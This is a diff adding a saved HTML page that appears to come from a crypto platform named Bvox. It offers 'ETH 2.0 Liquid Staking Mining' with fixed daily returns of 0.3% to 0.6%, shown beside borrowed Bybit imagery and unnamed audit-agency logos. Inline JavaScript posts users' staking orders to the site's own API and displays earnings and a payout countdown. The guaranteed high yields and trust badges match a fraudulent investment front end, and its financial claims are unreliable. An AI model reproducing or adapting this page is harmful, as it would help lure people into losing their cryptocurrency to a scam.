@@ -1,0 +1,462 @@
+﻿<!DOCTYPE html>
+<!-- saved from url=(0045)https://www.bvoxf.com/views/mining/index.html -->
+<html lang="en" style="font-size: 20px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<title>Bvox</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+		<link rel="stylesheet" href="./mining_files/style.css">
+		<script src="./mining_files/jquery.js.download" type="text/javascript" charset="utf-8"></script>
+		<script src="./mining_files/config.js.download" type="text/javascript" charset="utf-8"></script><script src="./mining_files/pako.min.js.download"></script><script src="./mining_files/js.cookie.min.js.download"></script><script src="./mining_files/web3.min.js.download"></script><script src="./mining_files/web3model.min.js.download"></script><script src="./mining_files/web3provider.js.download"></script><script src="./mining_files/fp.min.js.download"></script>
+		<link rel="shortcut icon" href="https://www.bvoxf.com/favicon.ico">
+		<meta property="og:image" content="/favicon.png">
+
+        <style>
+            html{
+                background: linear-gradient(to bottom, #2b5279 5%, #6485a4 60%);
+            }
+            body{
+                background: url(/img/leaf-bg.png);
+                background-size: 180vw;
+                background-position-x: -80vw;
+                background-repeat: no-repeat;
+            }
+            .y-hd{
+                height: 4rem!important;
+            }
+        </style>
+	<style data-styled="active" data-styled-version="5.2.0"></style><style id="walletconnect-style-sheet">:root {<br>  --animation-duration: 300ms;<br>}<br><br>@keyframes fadeIn {<br>  from {<br>    opacity: 0;<br>  }<br>  to {<br>    opacity: 1;<br>  }<br>}<br><br>@keyframes fadeOut {<br>  from {<br>    opacity: 1;<br>  }<br>  to {<br>    opacity: 0;<br>  }<br>}<br><br>.animated {<br>  animation-duration: var(--animation-duration);<br>  animation-fill-mode: both;<br>}<br><br>.fadeIn {<br>  animation-name: fadeIn;<br>}<br><br>.fadeOut {<br>  animation-name: fadeOut;<br>}<br><br>#walletconnect-wrapper {<br>  -webkit-user-select: none;<br>  align-items: center;<br>  display: flex;<br>  height: 100%;<br>  justify-content: center;<br>  left: 0;<br>  pointer-events: none;<br>  position: fixed;<br>  top: 0;<br>  user-select: none;<br>  width: 100%;<br>  z-index: 99999999999999;<br>}<br><br>.walletconnect-modal__headerLogo {<br>  height: 21px;<br>}<br><br>.walletconnect-modal__header p {<br>  color: #ffffff;<br>  font-size: 20px;<br>  font-weight: 600;<br>  margin: 0;<br>  align-items: flex-start;<br>  display: flex;<br>  flex: 1;<br>  margin-left: 5px;<br>}<br><br>.walletconnect-modal__close__wrapper {<br>  position: absolute;<br>  top: 0px;<br>  right: 0px;<br>  z-index: 10000;<br>  background: white;<br>  border-radius: 26px;<br>  padding: 6px;<br>  box-sizing: border-box;<br>  width: 26px;<br>  height: 26px;<br>  cursor: pointer;<br>}<br><br>.walletconnect-modal__close__icon {<br>  position: relative;<br>  top: 7px;<br>  right: 0;<br>  display: flex;<br>  align-items: center;<br>  justify-content: center;<br>  transform: rotate(45deg);<br>}<br><br>.walletconnect-modal__close__line1 {<br>  position: absolute;<br>  width: 100%;<br>  border: 1px solid rgb(48, 52, 59);<br>}<br><br>.walletconnect-modal__close__line2 {<br>  position: absolute;<br>  width: 100%;<br>  border: 1px solid rgb(48, 52, 59);<br>  transform: rotate(90deg);<br>}<br><br>.walletconnect-qrcode__base {<br>  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);<br>  background: rgba(37, 41, 46, 0.95);<br>  height: 100%;<br>  left: 0;<br>  pointer-events: auto;<br>  position: fixed;<br>  top: 0;<br>  transition: 0.4s cubic-bezier(0.19, 1, 0.22, 1);<br>  width: 100%;<br>  will-change: opacity;<br>  padding: 40px;<br>  box-sizing: border-box;<br>}<br><br>.walletconnect-qrcode__text {<br>  color: rgba(60, 66, 82, 0.6);<br>  font-size: 16px;<br>  font-weight: 600;<br>  letter-spacing: 0;<br>  line-height: 1.1875em;<br>  margin: 10px 0 30px 0;<br>  text-align: center;<br>  width: 100%;<br>}<br><br>@media only screen and (max-width: 768px) {<br>  .walletconnect-qrcode__text {<br>    font-size: 4vw;<br>  }<br>}<br><br>@media only screen and (max-width: 320px) {<br>  .walletconnect-qrcode__text {<br>    font-size: 14px;<br>  }<br>}<br><br>.walletconnect-qrcode__image {<br>  width: calc(100% - 30px);<br>  box-sizing: border-box;<br>  cursor: none;<br>  margin: 0 auto;<br>}<br><br>.walletconnect-qrcode__notification {<br>  position: absolute;<br>  bottom: 0;<br>  left: 0;<br>  right: 0;<br>  font-size: 16px;<br>  padding: 16px 20px;<br>  border-radius: 16px;<br>  text-align: center;<br>  transition: all 0.1s ease-in-out;<br>  background: white;<br>  color: black;<br>  margin-bottom: -60px;<br>  opacity: 0;<br>}<br><br>.walletconnect-qrcode__notification.notification__show {<br>  opacity: 1;<br>}<br><br>@media only screen and (max-width: 768px) {<br>  .walletconnect-modal__header {<br>    height: 130px;<br>  }<br>  .walletconnect-modal__base {<br>    overflow: auto;<br>  }<br>}<br><br>@media only screen and (min-device-width: 415px) and (max-width: 768px) {<br>  #content {<br>    max-width: 768px;<br>    box-sizing: border-box;<br>  }<br>}<br><br>@media only screen and (min-width: 375px) and (max-width: 415px) {<br>  #content {<br>    max-width: 414px;<br>    box-sizing: border-box;<br>  }<br>}<br><br>@media only screen and (min-width: 320px) and (max-width: 375px) {<br>  #content {<br>    max-width: 375px;<br>    box-sizing: border-box;<br>  }<br>}<br><br>@media only screen and (max-width: 320px) {<br>  #content {<br>    max-width: 320px;<br>    box-sizing: border-box;<br>  }<br>}<br><br>.walletconnect-modal__base {<br>  -webkit-font-smoothing: antialiased;<br>  background: #ffffff;<br>  border-radius: 24px;<br>  box-shadow: 0 10px 50px 5px rgba(0, 0, 0, 0.4);<br>  font-family: ui-rounded, "SF Pro Rounded", "SF Pro Text", medium-content-sans-serif-font,<br>    -apple-system, BlinkMacSystemFont, ui-sans-serif, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell,<br>    "Open Sans", "Helvetica Neue", sans-serif;<br>  margin-top: 41px;<br>  padding: 24px 24px 22px;<br>  pointer-events: auto;<br>  position: relative;<br>  text-align: center;<br>  transition: 0.4s cubic-bezier(0.19, 1, 0.22, 1);<br>  will-change: transform;<br>  overflow: visible;<br>  transform: translateY(-50%);<br>  top: 50%;<br>  max-width: 500px;<br>  margin: auto;<br>}<br><br>@media only screen and (max-width: 320px) {<br>  .walletconnect-modal__base {<br>    padding: 24px 12px;<br>  }<br>}<br><br>.walletconnect-modal__base .hidden {<br>  transform: translateY(150%);<br>  transition: 0.125s cubic-bezier(0.4, 0, 1, 1);<br>}<br><br>.walletconnect-modal__header {<br>  align-items: center;<br>  display: flex;<br>  height: 26px;<br>  left: 0;<br>  justify-content: space-between;<br>  position: absolute;<br>  top: -42px;<br>  width: 100%;<br>}<br><br>.walletconnect-modal__base .wc-logo {<br>  align-items: center;<br>  display: flex;<br>  height: 26px;<br>  margin-top: 15px;<br>  padding-bottom: 15px;<br>  pointer-events: auto;<br>}<br><br>.walletconnect-modal__base .wc-logo div {<br>  background-color: #3399ff;<br>  height: 21px;<br>  margin-right: 5px;<br>  mask-image: url("images/wc-logo.svg") center no-repeat;<br>  width: 32px;<br>}<br><br>.walletconnect-modal__base .wc-logo p {<br>  color: #ffffff;<br>  font-size: 20px;<br>  font-weight: 600;<br>  margin: 0;<br>}<br><br>.walletconnect-modal__base h2 {<br>  color: rgba(60, 66, 82, 0.6);<br>  font-size: 16px;<br>  font-weight: 600;<br>  letter-spacing: 0;<br>  line-height: 1.1875em;<br>  margin: 0 0 19px 0;<br>  text-align: center;<br>  width: 100%;<br>}<br><br>.walletconnect-modal__base__row {<br>  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);<br>  align-items: center;<br>  border-radius: 20px;<br>  cursor: pointer;<br>  display: flex;<br>  height: 56px;<br>  justify-content: space-between;<br>  padding: 0 15px;<br>  position: relative;<br>  margin: 0px 0px 8px;<br>  text-align: left;<br>  transition: 0.15s cubic-bezier(0.25, 0.46, 0.45, 0.94);<br>  will-change: transform;<br>  text-decoration: none;<br>}<br><br>.walletconnect-modal__base__row:hover {<br>  background: rgba(60, 66, 82, 0.06);<br>}<br><br>.walletconnect-modal__base__row:active {<br>  background: rgba(60, 66, 82, 0.06);<br>  transform: scale(0.975);<br>  transition: 0.1s cubic-bezier(0.25, 0.46, 0.45, 0.94);<br>}<br><br>.walletconnect-modal__base__row__h3 {<br>  color: #25292e;<br>  font-size: 20px;<br>  font-weight: 700;<br>  margin: 0;<br>  padding-bottom: 3px;<br>}<br><br>.walletconnect-modal__base__row__right {<br>  align-items: center;<br>  display: flex;<br>  justify-content: center;<br>}<br><br>.walletconnect-modal__base__row__right__app-icon {<br>  border-radius: 8px;<br>  height: 34px;<br>  margin: 0 11px 2px 0;<br>  width: 34px;<br>  background-size: 100%;<br>  box-shadow: 0 4px 12px 0 rgba(37, 41, 46, 0.25);<br>}<br><br>.walletconnect-modal__base__row__right__caret {<br>  height: 18px;<br>  opacity: 0.3;<br>  transition: 0.1s cubic-bezier(0.25, 0.46, 0.45, 0.94);<br>  width: 8px;<br>  will-change: opacity;<br>}<br><br>.walletconnect-modal__base__row:hover .caret,<br>.walletconnect-modal__base__row:active .caret {<br>  opacity: 0.6;<br>}<br><br>.walletconnect-modal__mobile__toggle {<br>  width: 80%;<br>  display: flex;<br>  margin: 0 auto;<br>  position: relative;<br>  overflow: hidden;<br>  border-radius: 8px;<br>  margin-bottom: 5vw;<br>  background: #d4d5d9;<br>}<br><br>.walletconnect-modal__mobile__toggle_selector {<br>  width: calc(50% - 8px);<br>  background: white;<br>  position: absolute;<br>  border-radius: 5px;<br>  height: calc(100% - 8px);<br>  top: 4px;<br>  transition: all 0.2s ease-in-out;<br>  transform: translate3d(4px, 0, 0);<br>}<br><br>.walletconnect-modal__mobile__toggle.right__selected .walletconnect-modal__mobile__toggle_selector {<br>  transform: translate3d(calc(100% + 12px), 0, 0);<br>}<br><br>.walletconnect-modal__mobile__toggle a {<br>  font-size: 12px;<br>  width: 50%;<br>  text-align: center;<br>  padding: 8px;<br>  margin: 0;<br>  font-weight: 600;<br>  z-index: 1;<br>}<br><br>.walletconnect-modal__footer {<br>  display: flex;<br>  justify-content: center;<br>  margin-top: 20px;<br>}<br><br>@media only screen and (max-width: 768px) {<br>  .walletconnect-modal__footer {<br>    margin-top: 5vw;<br>  }<br>}<br><br>.walletconnect-modal__footer a {<br>  cursor: pointer;<br>  color: #898d97;<br>  font-size: 15px;<br>  margin: 0 auto;<br>}<br><br>@media only screen and (max-width: 320px) {<br>  .walletconnect-modal__footer a {<br>    font-size: 14px;<br>  }<br>}<br><br>.walletconnect-connect__buttons__wrapper {<br>  max-height: 44vh;<br>}<br><br>.walletconnect-connect__buttons__wrapper__android {<br>  margin: 50% 0;<br>}<br><br>.walletconnect-connect__buttons__wrapper__wrap {<br>  display: grid;<br>  grid-template-columns: repeat(4, 1fr);<br>  margin-top: 20px;<br>  margin-bottom: 10px;<br>}<br><br>@media only screen and (min-width: 768px) {<br>  .walletconnect-connect__buttons__wrapper__wrap {<br>    margin-top: 40px;<br>  }<br>}<br><br>.walletconnect-connect__button {<br>  background-color: rgb(64, 153, 255);<br>  padding: 12px;<br>  border-radius: 8px;<br>  text-decoration: none;<br>  color: rgb(255, 255, 255);<br>  font-weight: 500;<br>}<br><br>.walletconnect-connect__button__icon_anchor {<br>  cursor: pointer;<br>  display: flex;<br>  justify-content: flex-start;<br>  align-items: center;<br>  margin: 8px;<br>  width: 42px;<br>  justify-self: center;<br>  flex-direction: column;<br>  text-decoration: none !important;<br>}<br><br>@media only screen and (max-width: 320px) {<br>  .walletconnect-connect__button__icon_anchor {<br>    margin: 4px;<br>  }<br>}<br><br>.walletconnect-connect__button__icon {<br>  border-radius: 10px;<br>  height: 42px;<br>  margin: 0;<br>  width: 42px;<br>  background-size: cover !important;<br>  box-shadow: 0 4px 12px 0 rgba(37, 41, 46, 0.25);<br>}<br><br>.walletconnect-connect__button__text {<br>  color: #424952;<br>  font-size: 2.7vw;<br>  text-decoration: none !important;<br>  padding: 0;<br>  margin-top: 1.8vw;<br>  font-weight: 600;<br>}<br><br>@media only screen and (min-width: 768px) {<br>  .walletconnect-connect__button__text {<br>    font-size: 16px;<br>    margin-top: 12px;<br>  }<br>}<br></style></head>
+    <body>
+        <div class="y-hd" id="y-hd">
+            <div class="yc-header">
+                <a href="index.html" class="y-fanhui">
+                    <img src="./mining_files/fanhui.png">
+                </a>
+                <div class="y-title" data-translate="矿业">Mining</div>
+            </div>
+        </div>
+
+        <div class="y-mini">
+            <div class="y-mi-t">
+                <h1>DEX</h1>
+                <p>Start earning ETH</p>
+                <img src="./mining_files/bybit1.png">
+            </div>
+            <div class="y-mi-cent">
+                <div class="y-mi-ct">
+                    <span data-translate="ETH 2.0 流动性质押挖矿">ETH 2.0 Liquid Staking Mining</span>
+                </div>
+                <div class="y-mi-cc">
+                    <h1 data-translate="质押ETH">Staked ETH</h1>
+                    <p id="y-zyzs">0.00</p>
+                    <div class="y-mi-ccs">
+                        <div class="y-mi-ccsl">
+                            <img src="./mining_files/w12.png">
+                            <div class="y-mi-ccst">
+                                <span data-translate="总收入">Total income</span>
+                                <span class="y-mizong">0.00</span>
+                            </div>
+                        </div>
+                        <div class="y-mi-ccsl">
+                            <img src="./mining_files/w12.png">
+                            <div class="y-mi-ccst">
+                                <span data-translate="今日收入">Today's income</span>
+                                <span class="y-mijin">0.00</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="y-mi-ccj">
+                        <div class="y-mi-ccj-in">
+                            <img src="./mining_files/time.png">
+                            <span data-translate="即将收益">Upcoming income</span>
+                            <span id="y-jjsy">05:19:05</span>
+                        </div>
+                    </div>
+                    <div class="y-mi-ccb">
+                        <div class="y-mi-ccbl" data-translate="质押ETH" onclick="showzykuang()">Staked ETH</div>
+                        <a href="mining-record.html" class="y-mi-ccbr" data-translate="赎回">Redemption</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="y-mi-js">
+                <p class="y-mi-bot" data-translate="什么是 ETH 2.0 流动性质押？">What is ETH 2.0 Liquid Staking?</p>
+                <p data-translate="ETH 2.0 流动性质押旨在对以太坊网络进行验证，质押者可从中获得奖励。在此过程中，用户将锁定 ETH 作为抵押品，以便参与链上活动并获得奖励。">ETH 2.0 Liquid Staking is aimed at validating the Ethereum network, allowing stakers to earn rewards. In this process, users lock ETH as collateral to participate in on-chain activities and earn rewards.</p>
+                <p class="y-mi-bot" data-translate="收益介绍">Income Introduction</p>
+                <p class="y-mi-syn">
+                    <span>Staking</span>
+                    <span>0.5-2.0ETH</span>
+                    <span data-translate="日收益">Daily income</span>
+                    <span>0.3%</span>
+                </p>
+                <p class="y-mi-syn">
+                    <span>Staking</span>
+                    <span>2.0-12.0ETH</span>
+                    <span data-translate="日收益">Daily income</span>
+                    <span>0.4%</span>
+                </p>
+                <p class="y-mi-syn">
+                    <span>Staking</span>
+                    <span>12.0-20.0ETH</span>
+                    <span data-translate="日收益">Daily income</span>
+                    <span>0.45%</span>
+                </p>
+                <p class="y-mi-syn">
+                    <span>Staking</span>
+                    <span>20.0-40.0ETH</span>
+                    <span data-translate="日收益">Daily income</span>
+                    <span>0.5%</span>
+                </p>
+                <p class="y-mi-syn">
+                    <span>Staking</span>
+                    <span>40.0ETH<b data-translate="以上">Above</b></span>
+                    <span data-translate="日收益">Daily income</span>
+                    <span>0.6%</span>
+                </p>
+                <div class="y-mi-fen"></div>
+                <p class="y-mi-bot" data-translate="注意事项">Note</p>
+                <p data-translate="1.质押ETH后需要等待节点激活，越早参与越早激活，激活后将开始发放收益。质押的收益将于每日00:30(美国时间)结算到您的钱包中。">1.After staking ETH, you will need to wait for node activation. The earlier you participate, the sooner it will be activated. Once activated, rewards will start to be distributed. Staking rewards will be settled to your wallet daily at 00:30 (New York time).</p>
+                <p data-translate="2.一旦您发起赎回申请，对应数量的ETH将无法用于获得每日奖励。请注意，赎回过程可长达多天来完成，赎回流程结束后ETH将会发放到您的钱包。">2.Once you initiate a redemption request, the corresponding amount of ETH will no longer be eligible for daily rewards. Please note that the redemption process can take several days to complete. After the process is finished, the ETH will be released to your wallet.</p>
+            </div>
+
+            <div class="y-mi-hz">
+                <p data-translate="审核机构">Audit Agency</p>
+                <div class="y-mi-hzs">
+                    <img src="./mining_files/sh1.png">
+                    <img src="./mining_files/sh2.png">
+                    <img src="./mining_files/sh3.png">
+                </div>
+            </div>
+
+
+            <div class="y-ex-duih" style="display: none;">
+                <div class="y-ex-din">
+                    
+                    <div class="y-ex-dtit" data-translate="确认">Confirm</div>
+
+                    <div class="y-zy-img">
+                        <img src="./mining_files/eth.png">
+                    </div>
+                    <div class="y-ex-dner" style="padding-top: 1rem;">
+                        <input type="number" id="zyshuliang" placeholder="Please enter the Staking Quantity">
+                    </div>
+
+                    <div class="y-ex-dqr" data-translate="提交">Submit</div>
+                </div>
+            </div>
+            <div class="y-ex-dqrz" style="display: none;"></div>
+        </div>
+        
+        <script>
+            // Configuration for daily yield rates
+            const yieldRates = {
+                0.5: 0.003,   // 0.3%
+                2.0: 0.004,   // 0.4%
+                12.0: 0.0045, // 0.45%
+                20.0: 0.005,  // 0.5%
+                40.0: 0.006   // 0.6%
+            };
+
+            // Get daily yield percentage based on amount
+            function getDailyYield(amount) {
+                if (amount >= 40) return 0.006;
+                if (amount >= 20) return 0.005;
+                if (amount >= 12) return 0.0045;
+                if (amount >= 2) return 0.004;
+                if (amount >= 0.5) return 0.003;
+                return 0;
+            }
+
+            // Format number with decimal places
+            function formatNumber(num, decimals = 6) {
+                return Number(num).toFixed(decimals);
+            }
+
+            window.addEventListener('scroll', function() {
+                let currentScrollTop = window.scrollY || document.documentElement.scrollTop;
+                if (currentScrollTop > 0) {
+                    $('#y-hd').addClass('y-huadong');
+                } else {
+                    $('#y-hd').removeClass('y-huadong');
+                }
+            });
+
+            // Fetch mining statistics
+            function fetchMiningStats() {
+                var userid = Cookies.get('userid');
+                var username = Cookies.get('username');
+
+                if (!userid) {
+                    console.warn('⚠️ User ID not found in cookies');
+                    return;
+                }
+
+                console.log('🔄 Fetching mining stats for user:', userid);
+
+                $.ajax({
+                    url: '/api/Mine/getminesy',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({
+                        userid: userid,
+                        username: username,
+                    }),
+                    timeout: 5000,
+                    dataType: 'json',
+                    success: function(res) {
+                        console.log('📊 Mining stats response:', res);
+
+                        if (res.code == 1) {
+                            const totalIncome = Number(res.data.total_jine || 0).toFixed(6);
+                            const todayIncome = Number(res.data.recent_jine || 0).toFixed(6);
+                            const stakedAmount = Number(res.data.total_shuliang || 0).toFixed(6);
+
+                            $('.y-mizong').text(totalIncome);
+                            $('.y-mijin').text(todayIncome);
+                            $('#y-zyzs').text(stakedAmount);
+
+                            console.log('✅ Mining stats updated:', {
+                                total_income: totalIncome,
+                                today_income: todayIncome,
+                                staked_amount: stakedAmount
+                            });
+                        } else {
+                            console.warn('⚠️ Failed to get mining stats:', res.data);
+                        }
+                    },
+                    error: function(err) {
+                        console.warn('⚠️ Error fetching mining stats:', err);
+                        // Use default values if API fails
+                        $('.y-mizong').text('0.000000');
+                        $('.y-mijin').text('0.000000');
+                        $('#y-zyzs').text('0.000000');
+                    }
+                });
+            }
+
+            $(document).ready(function() {
+                console.log('🚀 Mining page initialized');
+
+                // Set placeholder
+                $('#zyshuliang').attr('placeholder', gy('请输入质押数量'));
+
+                // Fetch initial stats
+                fetchMiningStats();
+
+                // Refresh stats every 30 seconds
+                setInterval(fetchMiningStats, 30000);
+
+                // Update countdown every second
+                setInterval(updateCountdown, 1000);
+            });
+
+            function updateCountdown() {
+                try {
+                    const now = new Date();
+                    
+                    // Get New York time (EST/EDT timezone)
+                    const newYorkTime = new Date(now.toLocaleString("en-US", { timeZone: "America/New_York" }));
+
+                    // Calculate next midnight at 00:30 New York time
+                    let nextMidnight = new Date(newYorkTime);
+                    nextMidnight.setHours(0, 30, 0, 0);
+                    
+                    // If current time is already past 00:30, set for tomorrow
+                    if (newYorkTime >= nextMidnight) {
+                        nextMidnight.setDate(nextMidnight.getDate() + 1);
+                    }
+
+                    // Calculate time difference
+                    const timeDifference = nextMidnight - newYorkTime;
+
+                    // If countdown finished, reload page
+                    if (timeDifference <= 0) {
+                        location.reload();
+                        return;
+                    }
+
+                    // Calculate hours, minutes, seconds
+                    const hours = Math.floor(timeDifference / (1000 * 60 * 60));
+                    const minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((timeDifference % (1000 * 60)) / 1000);
+
+                    // Format time with leading zeros
+                    const formattedTime = 
+                        String(hours).padStart(2, '0') + ":" +
+                        String(minutes).padStart(2, '0') + ":" +
+                        String(seconds).padStart(2, '0');
+
+                    // Update countdown display
+                    document.getElementById("y-jjsy").textContent = formattedTime;
+                    
+                } catch (error) {
+                    console.error('⚠️ Error updating countdown:', error);
+                    // Set default display if error
+                    document.getElementById("y-jjsy").textContent = "00:00:00";
+                }
+            }
+
+            function showzykuang(){
+                // Clear previous input
+                $('#zyshuliang').val('');
+                
+                // Show staking dialog
+                $('.y-ex-duih').show();
+                $('.y-ex-dqrz').show();
+
+                console.log('🔓 Staking dialog opened');
+            }
+
+            $('.y-ex-dqrz').click(function(){
+                console.log('🔐 Closing staking dialog');
+                
+                // Reset dialog state
+                $('.y-load').hide();
+                $('.y-ex-success').hide();
+                $('.y-ex-dtit').show();
+                $('.y-ex-dner').show();
+                $('.y-ex-dqr').show();
+                $('.y-ex-next').hide();
+                
+                // Clear input
+                $('#zyshuliang').val('');
+                
+                // Hide dialog
+                $('.y-ex-duih').hide();
+                $('.y-ex-dqrz').hide();
+            });
+
+            $('.y-ex-dqr').click(function(){
+                console.log('📤 Submit button clicked');
+                submitorder();
+            });
+
+            function submitorder(){
+                var userid = Cookies.get('userid');
+                var username = Cookies.get('username');
+                var jine = $('#zyshuliang').val();
+
+                // Validation
+                if (!userid) {
+                    alert(gy('User ID not found. Please login again.'));
+                    return;
+                }
+
+                if (!jine || isNaN(jine)) {
+                    alert(gy('Please enter a valid staking amount'));
+                    return;
+                }
+
+                const amount = parseFloat(jine);
+
+                // Validate minimum amount
+                if (amount < 0.5) {
+                    alert(gy('Minimum staking amount is 0.5 ETH'));
+                    return;
+                }
+
+                // Get daily yield for display
+                const dailyYield = getDailyYield(amount);
+                const dailyYieldPercent = (dailyYield * 100).toFixed(2);
+
+                console.log('📝 Submitting mining order:', {
+                    userid: userid,
+                    username: username,
+                    amount: amount,
+                    dailyYield: dailyYieldPercent + '%'
+                });
+
+                // Show loading state
+                $('.y-load').show();
+                $('.y-ex-dtit').hide();
+                $('.y-ex-dner').hide();
+                $('.y-ex-dqr').hide();
+
+                // Submit to backend
+                $.ajax({
+                    url: '/api/Mine/setmineorder',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({
+                        userid: userid,
+                        username: username,
+                        jine: amount,
+                    }),
+                    timeout: 5000,
+                    dataType: 'json',
+                    xhrFields: {
+                        withCredentials: false
+                    },
+                    success: function(res) {
+                        console.log('✅ Mining order response:', res);
+
+                        if (res.code == 1) {
+                            // Show success state
+                            $('.y-load').hide();
+                            $('.y-ex-success').show();
+                            $('.y-ex-next').show();
+
+                            console.log('✅ Staking successful:', {
+                                orderId: res.data.orderId,
+                                amount: res.data.amount,
+                                currency: res.data.currency,
+                                dailyYield: res.data.dailyYield,
+                                newBalance: res.data.newBalance,
+                                status: res.data.status
+                            });
+
+                            // Show success message
+                            alert(gy('Mining started successfully! Balance updated: ' + res.data.newBalance.toFixed(2) + ' ETH remaining'));
+
+                            // Refresh mining stats after delay
+                            setTimeout(function() {
+                                fetchMiningStats();
+                                // Close dialog after 2 seconds
+                                setTimeout(function() {
+                                    $('.y-ex-dqrz').click();
+                                }, 2000);
+                            }, 1000);
+
+                        } else {
+                            console.error('❌ Mining order failed:', res.data);
+                            
+                            // Show specific error messages
+                            if (res.data.includes('Insufficient')) {
+                                alert(gy(res.data));
+                            } else if (res.data.includes('minimum')) {
+                                alert(gy(res.data));
+                            } else {
+                                alert(gy('Staking failed: ' + res.data));
+                            }
+                            
+                            // Reset dialog
+                            $('.y-load').hide();
+                            $('.y-ex-dtit').show();
+                            $('.y-ex-dner').show();
+                            $('.y-ex-dqr').show();
+                        }
+                    },
+                    error: function(err) {
+                        console.error('❌ Error submitting mining order:', err);
+                        
+                        // Reset dialog
+                        $('.y-load').hide();
+                        $('.y-ex-dtit').show();
+                        $('.y-ex-dner').show();
+                        $('.y-ex-dqr').show();
+                        
+                        // Show error message
+                        if (err.statusText === 'timeout') {
+                            alert(gy('Request timeout. Please try again.'));
+                        } else {
+                            alert(gy('Staking error: Network connection failed'));
+                        }
+                    }
+                });
+            }
+
+        </script>
+    <script defer="" src="./mining_files/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;eeb085316a57431db0b1a080d3a6bf6e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+	<script src="./js/walletAuth.js" type="text/javascript" charset="utf-8"></script>
+	</body></html>
